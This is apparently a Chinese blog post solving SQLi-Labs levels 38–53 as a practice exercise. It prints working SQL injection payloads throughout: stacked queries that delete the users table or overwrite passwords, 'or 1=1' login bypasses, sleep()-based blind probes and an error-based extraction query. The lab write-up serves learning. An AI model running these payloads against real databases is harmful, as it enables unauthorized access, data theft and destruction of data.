---
layout: post
title: SQL注入（十四）
desc: ""
keywords: ""
date: 2016-11-19
categories: []
tags: []
---

[audio mp3="http://chiahao.top/wp-content/uploads/2016/11/花たん-ロミオとシンデレラ.mp3"][/audio]

<h2>&gt; Background Music: ロミオとシンデレラ</h2>

<h2>Less-38</h2>

<h3>Stacked Query</h3>

<a href="http://www.sqlinjection.net/stacked-queries">参考资料</a>

一种全新的思路，除了完成闭合去查询以外，还可以去通过闭合分号来执行其他的SQL命令

<img src="http://oc42vgpoj.bkt.clouddn.com/Less38_stacked1_res.png" />

<pre class="lang:tsql decode:true">?id=0'; delete from users +--+</pre>

<img src="http://oc42vgpoj.bkt.clouddn.com/Less38_stacked2_res.png" />

堆叠查询是指在一次查询过程中执行多条SQL指令，我们可以通过这一点去混入我们想要执行的恶意指令，从而做到远比查询数据更多的事情。

以往我们利用UNION语句的攻击仅仅局限于了SELECT语句，但利用这种方式我们就可以去执行更多的语句，从一个简单的查询语句获取更多控制权限。

<h3>局限</h3>

<ol>
<li>堆叠查询并不总是适用。大多数情况下由于API或者数据库引擎不支持，我们没办法进行这种攻击。而且我们如果没有足够的执行权限，就不能对数据进行修改，或者其他手段的攻击。</li>
</ol>

<table>
<thead>
<tr>
  <th align="center">Database</th>
  <th align="center">    API   </th>
  <th align="center">    Result    </th>
</tr>
</thead>
<tbody>
<tr>
  <td align="center">  MySQL  </td>
  <td align="center">    PHP   </td>
  <td align="center">Not Supported</td>
</tr>
<tr>
  <td align="center">   SQL   </td>
  <td align="center">  Any API </td>
  <td align="center">   Supported  </td>
</tr>
<tr>
  <td align="center">  Oracle </td>
  <td align="center">  Any API </td>
  <td align="center">Not Supported</td>
</tr>
<tr>
  <td align="center">  MySQL  </td>
  <td align="center">Other API</td>
  <td align="center">   Supported  </td>
</tr>
</tbody>
</table>

<ol>
<li>查询结果可能无法获取。如果只是需要去挖掘数据的话，还是推荐用UNION语句，因为即使我们能够执行两条查询语句，程序往往被设计成只返回一条语句的结果，我们需要的数据可能没办法挖掘出来。</li>
</ol>

<h3>修改数据</h3>

<pre class="lang:tsql decode:true">?id=1'; update users set password='You are hacked' where username='Dumb' +--+</pre>

比如我们可以通过语句来修改密码数据，但这种攻击方法需要建立在我们掌握了这个数据库足够信息的前提下，比如已经获取到了这个数据库名  ，表名，列名等。

<h3>调用存储过程</h3>

待填

<h2>Less-39</h2>

整数型，同理

<pre class="lang:tsql decode:true ">?id=1 ; update users set password='You are hacked' where username='Dumb' +--+</pre>

<h2>Less-40</h2>

盲注，闭合注意一下

<pre class="lang:tsql decode:true ">?id=1'); update users set password='hellooooo' where username='Dumb'  +--+</pre>

<h2>Less-41</h2>

盲注，同40，不过是整数型

<h2>Less-42</h2>

POST型的注入，进去以后发现可以Create New User或者Change Passwd，但是作者显而易见是想让你"Hack your way in"

<h3>Fuzz</h3>

用户名处没有注入点，在密码处注入成功，万能密码绕过登录框

本来以为重点在登录之后，结果发现登陆进去以后是修改密码的功能，而且都被过滤掉了。

原来重点在登录密码的那个位置，可以利用他没有过滤这点去进行堆叠查询，创建新表或者执行其他命令

<h3>Payload</h3>

login_user=123&amp;login_password=1'; create table testttt like users # &amp;mysubmit=Login

<img src="http://oc42vgpoj.bkt.clouddn.com/Less42_puzzled.png" />
本来在想会不会因为前面的登录失败不会执行后面的建表命令，但测试结果表明即使前面失败了，后面的也照常执行了。想想也对，SQL会把这些命令都带进去，即使前面密码是错的后面也会带入执行

<h2>Less-43</h2>

<h3>Fuzz</h3>

随便输个引号报错了，发现好像是用引号加括号闭合的，我们构造一下

<img src="http://oc42vgpoj.bkt.clouddn.com/Less43_fuzz.png" />

<pre class="lang:tsql decode:true ">login_user=123&amp;login_password=123%27) or 1=1 # &amp;mysubmit=Login</pre>

成功绕过登陆判断

后面就同Less-42了

<pre class="lang:tsql decode:true">login_user=123&amp;login_password=123%27); create table less43 like users # &amp;mysubmit=Login</pre>

<img src="http://oc42vgpoj.bkt.clouddn.com/Less43_res.png" />

<h2>Less-44</h2>

同Less-43，换成了盲注

<pre class="lang:tsql decode:true ">login_user=123&amp;login_password=123%27) or sleep(3) # &amp;mysubmit=Login</pre>

判断闭合，唉或者直接用上题的技巧也可以哦

<h2>Less-45</h2>

<pre class="lang:tsql decode:true ">login_user=123&amp;login_password=123') or 1=1 # &amp;mysubmit=Login</pre>

<h2>Less-46</h2>

这次玩法变了，需要给sort参数赋予一个数值，返回一个表格。sort参数应该是决定排序方法的，因为不同值返回的顺序不同

Order by注入

<h3>Fuzz</h3>

据说?sort=1+desc和?sort=1+acs两个返回结果不同的话会存在注入，desc是倒序排列，acs是正序排列。原理待分析

<h3>Payload</h3>

<pre class="lang:tsql decode:true ">?sort=1' and (ascii(substr((select database()) ,1,1))) = 115 and if(1=1, sleep(1), null)</pre>

<h2>Less-47</h2>

其实46和47也可以用报错注入啊…

<pre class="lang:tsql decode:true">?sort=1' and (select 1 from (select count(*),
concat(0x3a,0x3a,(select table_name from information_schema.tables limit 1,1),
0x3a,0x3a,floor(rand(0)*2))name from information_schema.tables group by name)x) --+
</pre>

<h2>Less-48 &amp; Less-49</h2>

换成盲注了

<pre class="lang:tsql decode:true ">?sort=1 and sleep(1) +--+

?sort=1' and sleep(1) +--+
</pre>

<h2>Less-50 &amp; Less-51</h2>

堆叠查询

<pre class="lang:tsql decode:true">?sort=1; delete from users +--+
</pre>

<h2>Less-52 &amp; Less-53</h2>

换成盲注了

<pre class="lang:tsql decode:true ">?sort=1 and sleep(1) +--+

?sort=1' and sleep(1) +--+</pre>

<hr />

SQLi-Labs系列完结！

庆祝撒花！

真正刷了一遍收获还是很大的，但还是会觉得还有很多好玩的技巧可以掌握。以后再说吧